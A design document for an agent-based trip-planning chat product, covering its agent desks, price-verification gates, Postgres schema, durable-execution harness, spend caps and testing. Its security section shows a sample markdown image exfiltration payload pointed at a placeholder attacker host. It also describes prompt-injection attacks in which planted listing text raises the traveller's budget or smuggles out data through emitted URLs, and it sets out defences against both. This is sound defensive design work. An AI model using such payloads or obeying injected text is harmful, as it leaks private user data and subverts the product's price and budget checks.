# Globetrotty — Design

**Date:** 2026-08-15
**Revision:** v2, after five parallel reviews (right-sizing, harness/durability, data-model/security, product/supplier viability, article fidelity)
**Status:** Approved for planning
**Scope:** Slice 1 of 4 — the agent fleet (part 1) and the harness (part 2), deployed and running.

> **v1 → v2.** The architecture survived review; the commercial premise did not. Hotellook was discontinued in October 2025 and Travelpayouts has no hotel API at all; live flight fares are gated at 50,000 MAU behind terms that forbid this design's shape; affiliate revenue is roughly 6× short of covering frontier-model planning; and v1's central legal claim was inverted. v2 changes what the product *is*, keeps the architecture, and fixes ~30 defects the reviews found — including a provenance gate that checked IDs without checking the values attached to them.

## 1. What this is

A chat product that plans trips. A traveller types "we want a week in Portugal in September, near a beach, under 1,500 euros, and we're bringing a toddler" and an agency of models researches destinations, sweeps stays, checks its own arithmetic, has a senior reviewer read the offer, and brings her a priced itinerary. She accepts, and we hand her tracked deep links to book each component herself on the supplier's own site.

**It is a single-operator tool and a demonstrator, built for maximum quality.** One real user — the author — plus live demos. Not a business, not a multi-tenant product. That is the frame for every trade-off below, and it inverts several conclusions a commercial version would reach.

### What the audience of one buys us

**Quality is the objective function; cost is a bounded constraint, not a competing goal.** A commercial version at these token prices would have to put Haiku in the driver's seat. We don't. Opus 5 drives, Opus 5 reviews, and the spend caps exist to stop a runaway loop rather than to protect a margin. The articles' own advice — start with the strongest model, because a bad output should mean the idea failed rather than the model did — applies here without qualification.

**The commercial supplier constraints do not apply.** The 50,000-MAU gate on live fares, the 9%-look-to-book requirement, the prohibition on pre-generating booking links, the months-long Agoda partner track: every one of those exists to protect affiliate commission economics. With no commission to protect, we can use live sources that a commercial build cannot reach — see §2.

**The affiliate layer becomes demonstrative rather than load-bearing.** `tracking_ref`, the `conversions` table, and the click provenance chain stay in the design, because they are part 4's content and the series needs them to be real. They just aren't funding anything.

**Legal exposure collapses.** The linked-travel-arrangement question in §13 is a question about facilitating bookings for third parties at scale. Planning your own holiday is not that.

For anyone reading the series and planning an actual business on it: the numbers are unforgiving, and §13 records them. Published affiliate rates give ~$0.11–$0.35 revenue per planning conversation against $1.75–$4.00 of model spend — a −80% to −97% gross margin, needing roughly 6× the plausible conversion rate to break even. The three exits are to charge for it (~$49/yr is where competitors converged, and a subscription also dissolves the attribution-window problem), collapse model cost ~10×, or re-target the basket toward what actually pays — cars are 23–54% on a 365-day cookie, activities ~8%, insurance 25%, against flights at ~1%.

### The measurement mandate

Because this is a reference implementation, the fleet stays — the seats *are* the content. But a fleet you cannot measure is a fleet you can never justify or fire, so slice 1 ships the instrumentation that slice 2 will judge it with: a `gate_results` table, per-seat cost on every model call, and a version stamp on every configuration. "We hired seven architectures, measured them, and fired three" is a better parts 3–4 than either "we hired seven" or "we cut to three on a hunch."

### Non-goals for slice 1

| Not building | Why |
|---|---|
| Booking, payment, refunds, cancellation | Link-out. No money moves through us. |
| Check-my-booking, changes desk | We never see a booking. |
| Disruption watcher | Watches booked trips. There are none. |
| Confirmation email chain | Nothing is confirmed by us. |
| `check_entry_rules` / visa advice | No authoritative source, highest-consequence hallucination available. The desk declines and points at official sources — and the monitor flags any entry-requirement assertion in outbound text, since removing the tool removes the *justification* for such a sentence but not the model's ability to write one. |
| Evals suite (part 3), learning loop (part 4) | Slices 2 and 3. |

## 2. Decisions

| Decision | Choice | Reason |
|---|---|---|
| What it is | Single-operator tool + demonstrator, quality-first | One real user; cost is a bounded constraint, not a competing goal. |
| Commercial model | Link-out, affiliate optional | Removes merchant, PCI, and refund liability. Affiliate tracking is built because part 4 needs it, not because it funds anything. |
| Desks in v1 | Front desk + planning desk | Post-booking desks have no data behind them. |
| Frontend | Next.js App Router on Netlify | **Tiers 3 and 4 are standalone Netlify Functions, not Next.js route handlers** — background/scheduled API routes were a Runtime v4 feature and must be plain functions on v5. |
| Datastore | Supabase (Postgres + Auth + Realtime) | Real Postgres; RLS and the service-role trap are part 2 topics by name. |
| Auth | Supabase Auth, magic link, before the first message | Reviewers flagged this as a funnel cost. Accepted: at reference-implementation scale, funnel doesn't matter and every row having a real `user_id` from turn zero makes limits and memory work immediately. |
| Durable execution | Hand-rolled | It is part 2's content. Netlify Async Workloads is the documented alternative. |
| Live updates | **Split channel** — streamed prose + gated price artifacts | See §9. v1 refused streaming; that was a false dichotomy. |
| Flights | **Kiwi MCP** (live, free, unauthenticated) primary; **SerpApi Google Flights** as cross-check | Reversed from v2 now that commission is not the goal. Kiwi's MCP endpoint returns live prices, baggage, and `bookingUrl` deep links with no affiliate parameter and no MAU gate — strictly better data than the cached Travelpayouts feed a commercial build is forced onto. SerpApi is self-serve at $0.01–0.025/search, trivial at one-user volume, and gives a genuine second opinion for the freshness gate. |
| Hotels | **SearchApi.io Google Hotels** primary; constructed Booking/Agoda search URLs for hand-off | Also reversed. Hotellook is dead and Agoda MSE is a months-long partner track that exists to license *commission*; for personal use we can read live hotel prices and hand off to a constructed search URL. No contract, no MAU floor. Keyed and verified live 2026-08-16 — SearchApi.io rather than SerpApi, same engine name (`google_hotels`), different vendor and response envelope. |
| Affiliate adapters | Deferred, behind the same port | If this ever wants commission, Agoda MSE and the Travelpayouts links API slot in behind `Supplier` without touching the agent. Not slice 1. |
| Models | Driver Opus 5, reviewer Opus 5, cheap Haiku 4.5 (**dated ID**) | Start strongest so a bad output means the idea failed. `effort` set per seat. |
| Spend posture | $15/user/day, $8/conversation, **plus a global daily ceiling** | Per-user caps behind free magic-link signup are not a spend cap. |
| Proposals | In-chat card, Accept / **per-component actions** / Reject | Binary reject costs a full re-plan to change one hotel and produces an unlearnable free-text mix. |
| Escalation | Email to the operator, rate-limited, fixed-format | Best-effort, never fails a turn. |
| FAQ source | `content/faq.md`, version-controlled | Part 2's rule: prompts live in git. |

## 3. Architecture: the agency

```
                          HER MESSAGE (first in a conversation)
                                   │
                            ┌──────▼───────┐
              FAQs answered │  FRONT DESK  │  Haiku. Structured label,
              on the spot ◀─│              │  then never appears again.
                            └──────┬───────┘
                                   │ new_trip, or anything uncertain
                                   ▼
                          ┌────────────────────┐
                          │   PLANNING DESK    │  Opus 5 tool loop.
                          │  owns her file,    │  The only voice she hears.
                          │  holds the notebook│
                          └──┬─────────────────┘
                             │ staff, in parallel:
                             ├── destination scouts    Haiku, briefs, never prices
                             ├── flight explorer       plain code over the supplier port
                             ├── hotel explorer        plain code over the supplier port
                             └── transfer lookup       plain code
                             │
                          ┌──▼──────────────────────────────┐
                          │ BACK OFFICE                     │  rehydration + freshness +
                          │ every offer passes through      │  arithmetic: plain code
                          │                                 │  senior reviewer: Opus 5
                          └──┬──────────────────────────────┘
                             │ offer approved            (an async monitor reads finished
                             ▼                            conversations for drift and files
                        SHE ACCEPTS IN CHAT                alarms to a named channel)
                             │
                    ┌────────▼────────┐      ┌──────────────┐
                    │  THE CASHIER    │      │  HUMAN DESK  │  escalations by email,
                    │  capability-    │      │              │  fixed-format, rate-limited
                    │  aware re-quote │      │              │
                    └─────────────────┘      └──────────────┘
```

**Every seat is instrumented.** Each writes `gate_results` rows or `model_calls` rows carrying `seat`, `cost_micros`, `prompt_version`, and `model_config_id`, so "does the reviewer earn its keep?" is one `GROUP BY seat` and not an argument.

### The desks and their doors

```ts
const DESK_TOOLS = {
  front:    [],                                  // one call, one structured label
  planning: ['update_requirements', 'ask_user', 'research_destination',
             'explore_flights', 'explore_hotels', 'check_transfers',
             'propose_itinerary', 'revise_component',
             'hand_off_to_booking', 'escalate_to_human'],
};
```

The front desk returns a fixed label set via structured output; **on any parse failure it routes to planning**, never guesses, never drops. Scouts hold read-only tools and no outbound channel.

## 4. The tools

| Tool | Behind | Contract |
|---|---|---|
| `update_requirements` | code | Writes facts into the notebook **with per-field provenance** (`stated_by: user \| inferred \| tool`). Only user-message-derived changes may relax a constraint. Anything she didn't state stays `null`. |
| `ask_user` | code | 1–3 questions, parks the conversation. **Parking is a terminal turn status** (turn `done`, conversation `awaiting_user`) so the sweeper cannot resurrect and re-bill it. |
| `research_destination` | Haiku worker | One city, ≤300 words, words never prices. |
| `explore_flights` | code | Sweeps dates/airports/layovers via the supplier port. ISO dates only. |
| `explore_hotels` | code | Same for stays. |
| `check_transfers` | code | Airport-to-hotel minutes and cost. |
| `propose_itinerary` | code | **The back-office gate.** Takes references, not data. See §5. |
| `revise_component` | code | Scoped change to one component of an existing proposal (swap hotel, swap flight, shift dates ±N) without a full re-plan. |
| `hand_off_to_booking` | code | **The cashier.** Takes a `proposal_id`, never an itinerary. See §5. |
| `escalate_to_human` | code | Fixed-format (ids + enum reason codes, no model free text), rate-limited per user per day. |

`runTool` does: desk allowlist → permission gate → zod → **write a `pending` row to `tool_calls` keyed on the provider's `tool_use` id** → execute → store result → `trimForContext`. Every result from a `worker` or `api` door is **fenced on the way back into the driver's context** — a scout brief is untrusted text we merely paid for.

## 5. The gates

### `propose_itinerary` — the offer is a list of references, not data

v1 copied part 2's `checkProvenance`, which validates that a `sourceId` was seen and never checks the values attached to it. Two reviewers found it independently: the model can cite a genuine hotel with a genuine id and attach a hallucinated €89/night, provenance passes, and `checkBudget` then re-adds the *invented* number and finds it within budget. In a product whose worst failure is a wrong price, the strongest gate did not check prices.

**The fix is structural.** `propose_itinerary` accepts `{sourceId, quantity}` per item and nothing else. The gate **rehydrates** every field server-side from `tool_results` and discards whatever the model wrote:

```js
const items = offer.refs.map(r => sourceStore.get(convo.id, r.sourceId));   // typed, untrimmed
if (items.some(x => !x))        return `These items match no search result: …`;
if (stale(items))               return `These prices are older than we'll quote: … Re-search them.`;
if (mismatched(items, offer))   return `Item does not match the slot it was proposed for: …`;

const violations = [...checkCurrency(items, notebook),   // refuse, never convert
                    ...checkTotals(items),              // server-computed sums
                    ...checkBudget(items, notebook),
                    ...checkDates(items, notebook)];
if (violations.length) return violations.join(' ');

const review = await reviewOffer(rehydrated, notebook);
if (!review.approved && rounds < MAX_ROUNDS) return `Revise: ${review.issues.join('; ')}`;
if (!review.approved) return saveProposal(rehydrated, { gate_outcome: 'shipped_unapproved' });
return saveProposal(rehydrated, { gate_outcome: 'approved' });
```

Four things v1 and the articles both got wrong, now fixed: `rounds` is **persisted in turn state** so a crash can't reset the bound; the exhausted-rounds path no longer falls through and ships a reviewer-rejected offer looking identical to an approved one; every outcome writes a `gate_results` row; and `saveProposal` snapshots `requirements` onto the proposal so an offline replay in slice 2 judges the offer against the notebook it was actually judged against.

**Provenance defends against hallucination, not against an adversary who is legitimately in the supplier's index.** That sentence goes in the code as a comment.

### `hand_off_to_booking` — a capability-aware cashier

v1 claimed the re-quote prevents proposing €1,400 and landing her on €1,900. Against a *cached* supplier it cannot — it compares cache to cache, passes, and hands over a confident confirmation immediately before a mispriced checkout page. **A control that increases trust without increasing safety is worse than no control.**

Moving to live sources (§2) fixes this properly: with Kiwi MCP and SerpApi both returning live prices, `mayRequote` is genuinely `true` and the gate delivers the guarantee it claims. The capability negotiation below stays anyway, for three reasons — a live endpoint can degrade to cached under rate limiting, the mock supplier must be able to simulate both modes for slice 2's evals, and any future affiliate adapter will be cache-backed.

The supplier port declares its own honesty and the cashier reads it:

```ts
interface SupplierCapabilities {
  live: boolean;              // can we get a real-time price at all?
  mayRequote: boolean;        // is there a verification endpoint distinct from search?
  maxAgeSeconds: number;      // beyond this, a price is not quotable
  pricePersistence: 'none' | 'session' | '24h' | 'indefinite';   // per supplier ToS
}
```

1. Refuse unless the **stored proposal row** for this conversation carries `decision='accept'`, decided within 30 minutes. The model passes a `proposal_id`; it never passes an itinerary.
2. If `mayRequote`: re-quote every item against the verification endpoint. **Any item whose re-quote does not return a fresh, successful, same-currency price blocks the hand-off** — unknown is not unchanged.
3. Compare **per item and on item identity**, not just on the sum. A total that fell because a refundable fare became basic economy is a downgrade she never accepted. Tolerance is an explicit ±0.5%, not an accident of `>`.
4. If `!mayRequote`: **do not claim verification.** The hand-off copy becomes disclosure — "This was €1,412 when we found it 2 days ago. Prices move; check the total before you pay." Every price renders with its age, everywhere.
5. Build every URL **server-side** from `(supplier, item_id, our affiliate id)` via a fixed per-supplier template, with the final hostname allowlisted. Mint `link_clicks.id` first and embed it as the affiliate sub-id. Store the exact emitted URL.
6. **Link emission is the point of no return.** After it, nothing may mark the turn failed, nothing may re-quote that set, everything is best-effort.

`pricePersistence` is enforced in `trimForContext`: prices past their supplier's policy are stripped from context and the model is told to re-search rather than being allowed to quote them.

## 6. Data model

Supabase Postgres. **The worker connects as an RLS-subject role with the request identity set per transaction**, so `auth.uid()` resolves and a forgotten filter returns zero rows instead of another user's data. The service role is reserved for two audited modules: the sweeper and the retention job. `force row level security` on every table.

Full DDL lives in the implementation plan; the shape and the review-driven additions:

**`conversations`** — `user_id`, `title`, `desk`, `status` (`active | working | awaiting_user | limit_reached | escalated | failed | archived`), `requirements` jsonb (the notebook, **closed zod schema, minor units + explicit currency, per-field provenance**), `spend_usd_micros bigint`, timestamps.

**`turns`** — `conversation_id`, `user_id`, `status`, `state` jsonb, `attempts`, **`queued_at`**, `started_at`, **`heartbeat_at`**, `finished_at`, `spend_usd_micros`, `fail_reason` (`provider_down | fetch_failed | limit_reached | step_cap | deadline_exceeded | crash_loop | fenced | stalled`), `idempotency_key`.
- `unique (conversation_id, idempotency_key)` — the 50-button-presses fix.
- `unique (conversation_id) where status in ('queued','running')` — one active turn per conversation, so two turns can't lost-update the same notebook.

**`tool_calls`** — `(turn_id, call_id)` primary key, `status`, `result`. Written **before** execution. This is what stops a resume from sending a second escalation email, saving a second acceptable proposal, or emitting a second set of tracked links.

**`tool_results`** (the provenance corpus) — `(conversation_id, source_id)`, normalised `{price_minor, currency, dates, flight_no, name, supplier}`, `search_params`, `fetched_at`, `ttl`. **Untrimmed, append-only, retained at least as long as `model_calls`.** The model reads a trimmed view; the gate reads this.

**`proposals`** — `itinerary` jsonb (**rehydrated**, `itinerary_schema_version`), `requirements_snapshot`, `gate_outcome`, `review_rounds`, `review_issues`, `decision`, `reject_reason`, `decided_at`, `accepted_total_minor bigint`, **`accepted_currency`**, `turn_id`, `prompt_version`, `model_config_id`.

**`gate_results`** — `proposal_id`, `gate` (`provenance | freshness | currency | totals | budget | dates | reviewer`), `passed`, `round`, `detail`. The table that makes slice 2 possible.

**`link_clicks`** — `proposal_id`, `turn_id`, `user_id`, `item_id`, `supplier`, `url`, **`tracking_ref` (unique)**, `quoted_minor`, `currency`, `rendered_at`, `clicked_at`. `unique (proposal_id, item_id)`.

**`conversions`** — `tracking_ref`, `supplier`, `booked_at`, `amount_minor`, `currency`, `commission_minor`, `reported_at`. **Created empty in slice 1.** The join key is what cannot be added later; the rows arrive months after the click.

**`model_calls`** — `seat`, `prompt_version`, `model_config_id`, `effort`, `thinking_mode`, `max_tokens`, `model` (resolved), `request_id`, **`input_tokens`, `cache_creation_input_tokens`, `cache_read_input_tokens`, `output_tokens`, `cost_micros`**, `latency_ms`, `capture_policy`, prompts (nullable). Cache writes bill ~1.25× and reads ~0.1×, so one `cached_in` column cannot distinguish them — a 12.5× error. **This table is the append-only cost ledger; both counters are derived from it.**

**`agent_events`** — `conversation_id`, `turn_id`, `kind`, **structured** `payload` (`{tool, args_digest, result_count, source_ids, ok}`, human strings derived at render), 14-day retention, sanitised before Realtime broadcast.

**`user_memory`** (`user_id` FK) and **`source_memory`** (`source_key`) — split, because v1's single `agent_memory` keyed by a stringly-typed `scope_key` made an RLS policy inexpressible on the table with the worst leak consequences.

**`daily_usage`** — `(user_id, day)`, upserted atomically, **written on every model call**. In v1 this table was read by the $15/day limit and written by nothing, so that limit did not exist.

**Indexes** on every FK and every query path named in this spec. Postgres does not auto-index FK child columns; without them each cascade is a sequential scan and the sweeper's scan is what makes it miss its 30-second budget.

**Capture policy, decided now:** `driver` and `front_desk` always `full` and never sampled — they are the eval and training corpus. `reviewer` `full`. `scout`/`monitor` `truncated` above 8KB. A test asserts no driver row is ever `sampled_out`.

## 7. The harness

### Four tiers

```
browser (Next.js) ──── Supabase Realtime (messages + agent_events)
   │ POST /api/messages                        ▲
   ▼                                           │
[tier 2] sync route handler       10s          │  auth → fail-closed limits →
   │  HTTP POST + shared secret, 2s cap        │  append → insert turn → invoke
   ▼                                           │
[tier 3] netlify/functions/run-turn-background.mts   15 min
   │  claim → deadline-aware loop → heartbeat → park or complete
   ▼
[tier 4] netlify/functions/sweep.mts           30s, every 5 min
```

Tier 3's endpoint is publicly reachable and starts an Opus 5 run, so it takes a shared secret — otherwise it is an unauthenticated, uncapped spend endpoint.

### The claim, with a fencing token

```sql
update turns
   set status = 'running', started_at = now(), heartbeat_at = now(),
       attempts = attempts + 1
 where id = $1
   and attempts < 5
   and (status = 'queued' or (status = 'running' and heartbeat_at < now() - interval '90 seconds'))
returning *;
```

Claiming is exclusive; **writing was not.** The killed worker's in-flight I/O is not cancelled when Netlify kills the *function*, so a stalled `saveState` can land on top of the new worker's state minutes later. The claim already computes a fencing token and v1 never used it. Every subsequent write carries `and attempts = $claimed`; `rowCount === 0` means we have been fenced — abort immediately, write nothing else.

The staleness arm now measures **heartbeat silence, not elapsed time**, which is what lets the threshold drop from 20 minutes to 90 seconds. v1's 20-minute floor plus a 5-minute cron meant up to **25 minutes** of a dead turn looking identical to a healthy one.

**Netlify's platform retry is not a recovery mechanism, and v1 said it was.** Netlify retries only on an *unhandled exception*; `runTurn` catches everything, so it never fires. When it does fire (OOM, crash) it lands at 1 and 2 minutes against a threshold that must exceed the 15-minute kill ceiling — always too early to reclaim. The two mechanisms are mutually exclusive by construction. The sweeper is the only recovery path, and heartbeats are what make it fast.

### The sweeper, bounded

```sql
with batch as (
  select id from turns
   where (status = 'running' and heartbeat_at < now() - interval '90 seconds')
      or (status = 'queued'  and queued_at    < now() - interval '2 minutes')
   order by coalesce(heartbeat_at, queued_at)
   limit 100 for update skip locked)
update turns t set status = 'queued', queued_at = now() from batch
 where t.id = batch.id returning t.id;
```

Three v1 bugs closed. It now sees **`queued`** turns, so a failed invocation is no longer orphaned forever — v1's schema couldn't even express this fix, having no `queued_at`. It is **bounded**, so it can't flip 10,000 rows and then be killed mid-enqueue, leaving them in a state it no longer queries — the rescuer destroying the work it exists to rescue. And `attempts < 5` in the claim caps the crash loop that would otherwise re-pay for a poison turn every cycle forever. Enqueue with bounded concurrency; alarm on backlog depth.

Here `FOR UPDATE SKIP LOCKED` is genuinely correct — spreading a batch across workers is what it was built for, unlike the single-row claim where the status re-check was always the real safety.

### Wall clock

A planning turn can exceed 15 minutes: a dozen Opus 5 calls with thinking on, three parallel scouts, a fare sweep that is N×M supplier calls behind one tool, up to two reviewer rounds, and a `Retry-After: 60` that sleeps a full minute *inside* the budget. The loop is deadline-aware — at `DEADLINE - EST_STEP_MS` it persists state and re-invokes itself for a fresh window — and a `Retry-After` longer than the remaining budget becomes `Unretryable`.

### Turn completion is one transaction

```sql
begin;
  insert into messages (...);
  update conversations set status = 'awaiting_user', spend_usd_micros = spend_usd_micros + $x;
  update turns set status = 'done', state = $s, finished_at = now()
   where id = $t and attempts = $a;
commit;
-- then, and only then:
notifyUser(...).catch(logOnly);
```

v1 had five unbatched writes. A crash after `finishTurn` and before the message append left the turn `done`, the conversation `active`, and no agent message — and nothing rescues a `done` turn, so she paid for a full planning loop and the thread showed nothing, permanently. That violates part 2's own rule by ordering alone.

### Models, drift, and caching

```js
export const MODELS = {
  driver:   { id: 'claude-opus-5',              effort: 'high' },
  reviewer: { id: 'claude-opus-5',              effort: 'high' },
  cheap:    { id: 'claude-haiku-4-5-20251001',  effort: null   },  // Haiku takes no effort
};
```

**A correction to v1's departure.** "Current Claude model IDs carry no date suffix" is true for Opus 5 and **false for Haiku 4.5**, which has a real dated ID — and that is the highest-volume seat. It is pinned exactly as part 2 prescribes. The Opus seats cannot be, because appending a date 404s.

**And a warning on the mitigation.** If `response.model` echoes the alias for an aliased model, recording it detects nothing — every row reads identically before and after a weights swap, which is precisely the hole part 2 names. §13 carries this as a must-verify. If it confirms, the detector becomes behavioural: a nightly golden-prompt canary, fingerprinted and diffed, plus slice 2's fixed cases on a schedule. We also record the full request shape, because a silent provider-side change to a *default* is now as likely a drift vector as a weights change.

`effort` is set per seat and stamped on every call. It is the primary cost/latency lever on Opus 5 and v1 never mentioned it in a chapter about controlling spend. Lowering effort is not the silent degradation §8 forbids.

**Caching, corrected.** v1 put one breakpoint on the last system block and sent the transcript after it — so in a 20-step loop the transcript, which *is* the growing repeated prefix caching exists for, was never cached. Now: one breakpoint on system+tools with a 1h TTL (a resumed turn is always past the 5-minute default), a **rolling breakpoint on the last content block of the most recent turn**, and an intermediate one every ~15 blocks to stay inside the 20-block lookback window. Memory and the notebook sit after the breakpoint. The cache-read assertion is scoped per seat — Haiku's 4096-token minimum means the cheap seats are not expected to cache at all, and v1's blanket test would have given false confidence.

### Trace capture

Four rules, unchanged in intent: writes never fail the work they observe; credentials cannot enter, enforced by an allowlist test; retention is 90 days for `model_calls` and 14 for `agent_events`; `capture_policy` is always recorded so a missing trace is distinguishable from a dropped one.

**`recordSpend` is split from `recordSpan`.** The span is best-effort and swallowed. The spend is not — if it cannot be written, the turn stops. v1 inherited a single function and would have swallowed the guardrail in exactly the failure mode it was built for.

Derived labels that outlive the 90-day window are extracted at write time — routing labels and per-turn trajectory counters — because part 3 wants trends and part 4 wants a fine-tuning corpus, and both die at 90 days otherwise.

## 8. Cost control

- **Per model call, atomically:** `update conversations set spend_usd_micros = spend + $1 returning spend`, and the gate reads the **returned** value. v1 added spend once at turn end, so the "check before every driver call" compared against a number stale for the whole turn — a runaway 12-step turn passed the same stale check twice a dozen times.
- **Reserve before the call.** Cost is known only after the response, so a check-only design cannot be tight. Debit an upper bound computed from `count_tokens` on the assembled request plus `max_tokens` at list price, then reconcile. Batch fan-out reserves `n × estimate` before dispatch.
- **`daily_usage` is written on every call**, with the atomic upsert form spelled out. The day boundary is UTC and the UI says so.
- **Micros, not cents.** A Haiku classify rounds to zero in integer cents, so the window-shopper the ceiling exists to catch accumulated nothing.
- **Global daily ceiling, fail closed.** At one user this is the cap that actually matters — it protects against a runaway loop at 3am, not against abuse. Signup rate limiting and the new-account cap are specified but disabled; they exist so the multi-tenant path is a config change rather than a rewrite, and so the demo can show them.
- **Every model call debits** — front desk, titler, scouts, reviewer. The monitor charges an ops budget, not hers.
- **Per-turn supplier-call budget.** Supplier APIs are rate-limited and sometimes metered, and v1 counted them nowhere.
- **`stop_reason: "refusal"` is a branch**, checked before touching `content` — Opus 5 can return HTTP 200 with an empty content array. A refused driver call fails the turn with words she can act on and does not consume quota; a refused *reviewer* call is never read as approval.

## 9. What she sees

### The split channel

v1 refused token streaming, citing part 2. That argument was misapplied: the article's own text carves out chat interfaces explicitly and offers the compromise — stream the prose, hold the structured parts back. v1 also quoted the first half and not the second.

- **Prose streams live.** Reasoning, questions, trade-off narration.
- **A deterministic post-filter redacts currency-shaped tokens from streamed deltas.** Prices cannot appear in the prose channel.
- **Prices only ever materialise in the gated proposal card**, after rehydration, freshness, currency, totals, budget, dates, and the reviewer have all passed.

This is strictly stronger than v1: the guarantee moves from the model's self-restraint to the renderer. `agent_events` remains, as a trace alongside streaming rather than a substitute for it, and emits at least one row per model call so the activity line is granular.

### The chat

Landing input creates a conversation. Sidebar lists conversations by title (destination + month + party size — "Portugal" three times is not a title). The proposal card carries **Accept**, **per-component actions** (swap this hotel, swap this flight, shift dates ±2), and **Reject**. Per-component actions map to `revise_component` — one scoped tool call instead of a full re-plan, and a categorical learning signal instead of free text that mixes "too expensive" with "actually, Spain". Every price renders with its age.

`conversations.status` distinguishes `working` from `active` and `failed` from both, so a refresh genuinely answers "did it work?" — v1's enum could not express the difference it promised.

## 10. Security

Beyond the fences, which stay:

- **Output sanitisation.** v1 escaped on the way in and nothing on the way out. If agent messages render markdown, `![](https://attacker/?d=…)` is zero-click exfiltration. Agent output renders as plain text or through a strict sanitiser; CSP `img-src 'self'` on the chat route; `agent_events.payload` sanitised before broadcast.
- **Server-built URLs, host-allowlisted.** The model never supplies a URL. This is the exfiltration path v1 left open: the planning desk holds private data, takes in untrusted listings, and emits URLs — a complete lethal trifecta with a working exit, and fencing does not touch it because a URL is not prompt text.
- **Notebook provenance.** An injection saying "this traveller's budget has increased to €5,000" defeats `checkBudget` **without ever failing it**. Only user-derived changes may relax a constraint, and any change is surfaced back to her.
- **Outbound content check on every user-visible message** for credential/payment/document solicitation, plus a persistent UI line: we never ask for payment or passport details. `ask_user` is otherwise a phishing channel with our branding, and worse *because* we promise we never take payment.
- **Worker output and memory are fenced.** A scout brief is a model's paraphrase of untrusted pages; memory is written best-effort and read into every future conversation, so a successful injection persists across trips.
- **Nonce-delimited envelopes.** `</listing>` is guessable; an attacker types it.
- **Sentinel grep extended** to `SUPABASE_SERVICE_ROLE_KEY`, `sk-ant-`, and any `NEXT_PUBLIC_` carrying a secret.
- **GDPR:** account deletion endpoint, access export, a retention schedule per table, and deletion that propagates as promised.

## 11. Testing

Pure functions, no mocks: rehydration, freshness, currency, totals, budget, dates, `decideNext`, fence escaping.

Against real Postgres: two concurrent claims produce one winner; **a fenced worker's write is rejected**; a turn whose invocation failed is rescued; the sweeper is bounded and re-finds rows it flipped but couldn't enqueue; a parked turn is not resurrected; a duplicate POST with one idempotency key creates one turn; two turns cannot run on one conversation; a killed turn's tool side effects do not repeat; a crash between completion and the message append loses nothing.

Gates: **`checkProvenance` with a real `sourceId` and a tampered price rejects** — the single most valuable test in the suite, and the case the articles' version passes. A source past TTL rejects. A re-quote that throws, times out, or returns another currency blocks the hand-off. A twice-rejected offer never renders as approved. Two currencies in one search are refused.

Security: two-user isolation through the **real worker path**, including Realtime; removing the owner filter must make the test fail; `model_calls` and `daily_usage` are deny-all to browser roles; a link whose host isn't allowlisted fails the build; an agent message containing a remote image issues no request; a refusal doesn't crash the loop or consume quota.

## 12. Sequencing

| Slice | Contents | Gate |
|---|---|---|
| **1** | Fleet, harness, split-channel chat UI, supplier port, `MockSupplier`, Kiwi MCP + SerpApi adapters | — |
| **1b (1-day spike)** | Paste-a-confirmation in chat, and a `trips@` forwarding address | Run *inside* slice 1. If nobody forwards anything, that is the free answer to whether slice 4 should exist. |
| **2** | Part 3: golden trips, simulated user, trajectory checks, calibrated judges — and the first seat-by-seat cost and gate-outcome report | Real traces accumulating |
| **3** | Part 4: examples, memory writes, judge calibration, hypothesis→prompt→canary | Enough decided proposals |
| **4** | Changes desk and disruption watcher | Evidence from 1b |

No business-development track blocks anything. Every source in slice 1 is self-serve or open.

## 13. Assumptions and accepted risks

**Verified 2026-08-15 (probed live):**

- **Kiwi MCP is live, unauthenticated, and stateless.** `POST https://mcp.kiwi.com`, SSE response, no session handshake required — `tools/list` and `tools/call` work on a bare POST. Server `kiwicom-flight-search` v1.28.1.
- **One call covers the date grid.** `search-flight` takes `flyFrom`/`flyTo` (IATA *or* place name), `departureDate` in **dd/mm/yyyy**, `departureDateFlexDays` (±N), `returnDate`/`returnDateFlexDays`, `adults`/`children`/`infants`, `cabinClass`, `currency`, `locale`, `max_sector_stopovers`, `nights_in_dst_from/to`, `one_for_city` (the "I don't know where" case in a single call), and per-passenger bag counts. `explore_flights` is therefore **one call, not an N×M sweep**.
- **The response carries what the gates need.** `{query, currency, passengers, resultsCount, itineraries, searchTimeMs}`; each itinerary has `id`, `price`, `priceFormatted`, `totalDurationSeconds`, `bookingUrl`, `baggage {personalItem, cabinBag, checkedBag}`, and `outbound`/`inbound` legs with `route`, local ISO times, `stops`, `cabinClass`, and `segments` carrying `carrier`/`carrierName`. Currency is a request parameter, which closes the market-scoping risk.
- **Itinerary IDs are stable across repeated identical searches** — 15/15 matched on both ID and price. **This is what makes `quote()` implementable**: re-run the stored search params, find by native ID, compare; absent means unavailable. `mayRequote: true` is real, not aspirational.
- **`bookingUrl` is a `kiwi.com` short link.** It is supplier-supplied data flowing into an outbound request, so §10's host allowlist applies to it directly.

**Two live-data findings that change the design:**

- **`allow_self_transfer` defaults to `true`.** That is Kiwi's virtual interlining: a missed connection is the traveller's problem, not the airline's. `explore_flights` sets it explicitly, and any itinerary relying on it must say so on the card.
- **The cheapest result is routinely the wrong recommendation.** The €628 Berlin→Faro option returns `checkedBag: 0` for two adults and an infant flying for a week. Baggage counts are carried into the notebook comparison and rendered on the card; a budget-matching agent without them confidently recommends the worse trip.

**Also verified 2026-08-16 (probed live):**

- **`response.model` echoes the alias verbatim.** A request for `claude-opus-5` returns `"model": "claude-opus-5"` — not a resolved dated version. **§7's drift mitigation by string comparison detects nothing**, and every `model_calls` row reads identically before and after a weights change. The behavioural canary is therefore not optional, it is the only mechanism: pin `model_config_id` to a dated ID where one exists, and detect drift on aliased seats by periodically replaying a fixed prompt set and alarming on output distribution, never on the returned string. Part 2's drift paragraph is annotated accordingly.
- **SearchApi.io Google Hotels is keyed and live.** 20 Faro properties in 1.5s. Each carries `property_token` (stable, so `quote()` is implementable the same way Kiwi's is), `total_price` **and** `price_before_taxes`, `gps_coordinates`, `rating`, and an `offers[]` array naming the booking source. The pre-tax/total split is a gate surface in its own right: a supplier that quotes pre-tax and a notebook budget that means all-in disagree silently unless `checkTotals` reads the same field the card renders.
- **Kiwi returns `price` as a JSON float** (`454.0`) and leg times as **naive local ISO with no offset** (`2026-09-12T16:40:00`). Both are adapter-boundary hazards: the float must be rounded into `bigint` minor units exactly once, and a naive timestamp parsed as UTC silently shifts every date-window check.

**Still to verify:**
1. **`bookingUrl` lifetime** — how long a `kiwi.com/u/…` short link stays valid, which bounds the acceptable gap between proposal and hand-off.
2. **Kiwi's terms on programmatic use.** The endpoint is open; that is not the same as sanctioned. Worth reading before this is demoed publicly.
3. **SearchApi.io coverage and the Google litigation shield**, whose protection applies only from the higher-priced tiers. Immaterial at one user; recorded because it is the kind of thing that changes when the audience does.

**Accepted risks, recorded deliberately:**

